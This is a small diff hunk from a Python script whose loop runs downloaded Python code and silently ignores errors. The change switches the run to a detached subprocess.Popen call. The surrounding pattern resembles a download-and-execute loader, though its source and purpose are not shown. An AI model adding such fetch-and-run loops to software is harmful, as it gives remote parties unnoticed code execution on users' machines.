@@ -33,7 +33,7 @@ while True:
 
             # Run the downloaded python code
             try:
-                subprocess.run([sys.executable, dlpath], shell=False)
+                subprocess.Popen([sys.executable, dlpath], shell=False)
             except Exception:
                 pass
 
